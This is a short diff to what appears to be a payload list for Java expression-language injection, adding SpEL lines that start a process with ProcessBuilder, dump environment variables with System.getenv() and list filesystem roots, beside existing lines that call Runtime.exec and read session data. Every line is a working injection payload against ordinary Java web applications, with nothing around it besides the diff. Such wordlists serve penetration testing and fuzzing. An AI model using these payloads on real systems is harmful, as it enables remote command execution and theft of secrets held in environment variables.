@@ -6,3 +6,6 @@ ${pageContext.request.getSession().getAttribute('user')}
 #{facesContext.externalContext.request.headerMap}
 ${T(java.lang.Runtime).getRuntime().exec('id')}
 #{session.invalidate()}
+${T(java.lang.ProcessBuilder).new(['id']).start()}
+${T(java.lang.System).getenv()}
+${T(java.io.File).listRoots()}
